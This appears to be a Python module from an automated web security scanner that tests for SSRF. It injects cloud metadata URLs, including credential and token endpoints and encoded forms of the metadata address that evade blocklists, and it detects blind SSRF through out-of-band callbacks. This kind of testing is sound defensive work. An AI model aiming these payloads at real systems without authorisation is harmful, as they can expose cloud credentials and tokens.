"""SSRF detection actions — basic, blind, cloud-metadata probing."""

from actions.registry import action, ActionContext, ActionResult
from core.validators import inject_param
from core.verification_oracle import VerificationOracle, InteractshClient
from tools.wrappers import curl


# The link-local metadata address in forms a naive SSRF blocklist misses:
# dotted, decimal, octal, hex and IPv6-mapped all resolve to 169.254.169.254.
# Trying each is how an SSRF that is "blocked" on the obvious string still
# reaches the metadata service.
_AWS_HOSTS = (
    "169.254.169.254",      # dotted
    "2852039166",           # decimal
    "0251.0376.0251.0376",  # octal
    "0xA9.0xFE.0xA9.0xFE",  # hex
    "[::ffff:169.254.169.254]",  # IPv6-mapped
)

CLOUD_METADATA_URLS = {
    "aws": [f"http://{h}/latest/meta-data/" for h in _AWS_HOSTS]
           + [f"http://{h}/latest/meta-data/iam/security-credentials/"
              for h in _AWS_HOSTS[:2]]
           + ["http://169.254.169.254/latest/user-data/"],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "digitalocean": ["http://169.254.169.254/metadata/v1.json",
                     "http://169.254.169.254/metadata/v1/"],
    "alibaba": ["http://100.100.100.200/latest/meta-data/",
                "http://100.100.100.200/latest/meta-data/ram/security-credentials/"],
    "oracle": ["http://169.254.169.254/opc/v2/instance/",
               "http://169.254.169.254/opc/v1/instance/"],
    "kubernetes": ["https://kubernetes.default.svc/api",
                   "http://169.254.169.254/latest/meta-data/"],
}

# A 200 alone is not metadata: any echo service answers 200. Each
# provider must name itself in the body before the finding is filed.
CLOUD_METADATA_MARKERS = {
    "aws": ("ami-id", "instance-id", "security-credentials", "ami-launch-index"),
    "gcp": ("service-accounts", "project-id", "instance/", "zone"),
    "azure": ("azEnvironment", "compute", "network", "subscriptionId"),
    "digitalocean": ("droplet_id", "region", "interfaces", "floating_ip"),
    "alibaba": ("instance-id", "security-credentials", "region-id", "zone-id"),
    "oracle": ("displayName", "compartmentId", "availabilityDomain", "ociAdName"),
    "kubernetes": ("apiVersion", "serverAddressByClientCIDRs", "kind"),
}


@action(
    id="web.ssrf.cloud_metadata",
    risk="MEDIUM",
    detectability="high",
    requires=["url", "param"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=120,
    description="Test SSRF by attempting to reach cloud metadata endpoints",
    category="web",
)
async def ssrf_cloud_metadata(ctx: ActionContext) -> ActionResult:
    url = ctx.params["url"]
    param = ctx.params["param"]
    method = ctx.params.get("method", "GET")

    findings = []

    for provider, metadata_urls in CLOUD_METADATA_URLS.items():
        markers = CLOUD_METADATA_MARKERS.get(provider, ())
        for metadata_url in metadata_urls:
            test_url = inject_param(url, param, metadata_url)
            result = await curl(test_url, method=method, output="full")
            body = result.get("body", "") or ""
            status = result.get("status", 0)
            lowered = body.lower()

            if status == 200 and body and len(body) > 10 and \
                    any(marker in lowered for marker in markers):
                hit = next(marker for marker in markers if marker in lowered)
                findings.append({
                    "provider": provider,
                    "metadata_url": metadata_url,
                    "status": status,
                    "marker": hit,
                    "body_preview": body[:300],
                })

    if findings:
        return ActionResult(
            success=True,
            confidence="FIRM",
            data={"findings": findings},
            evidence={"ssrf_cloud": {"url": url, "param": param, "findings": findings}},
        )

    return ActionResult(False, error="no cloud metadata accessible via SSRF",
                        confidence="TENTATIVE")


@action(
    id="web.ssrf.oob_detect",
    risk="LOW",
    detectability="medium",
    requires=["url", "param"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=60,
    description="Test blind SSRF via out-of-band callback detection",
    category="web",
)
async def ssrf_oob_detect(ctx: ActionContext) -> ActionResult:
    url = ctx.params["url"]
    param = ctx.params["param"]
    method = ctx.params.get("method", "GET")

    interactsh = InteractshClient()
    corr_id = await interactsh.register_callback(f"ssrf-test-{param}")

    oob_url = interactsh.callback_url(corr_id, "/test")
    if not interactsh.enabled or not corr_id or "oob.invalid" in oob_url:
        # Unconfigured OOB: injecting a *.oob.invalid host would cost a
        # request against the target and prove nothing. Stay honest.
        return ActionResult(False, error="OOB not configured; blind SSRF "
                                        "untestable without a callback channel",
                            confidence="TENTATIVE",
                            data={"correlation_id": corr_id})
    test_url = inject_param(url, param, oob_url)

    await curl(test_url, method=method, output="status")

    # Poll for callback
    verdict = await interactsh.verify(f"ssrf-test-{param}", poll=True)

    if verdict.confidence.value == "CONFIRMED":
        return ActionResult(
            success=True,
            confidence="CONFIRMED",
            data={"correlation_id": corr_id, "technique": "oob_ssrf"},
            evidence=verdict.evidence,
        )

    return ActionResult(False, error="no OOB SSRF callback detected",
                        confidence="TENTATIVE",
                        data={"correlation_id": corr_id})
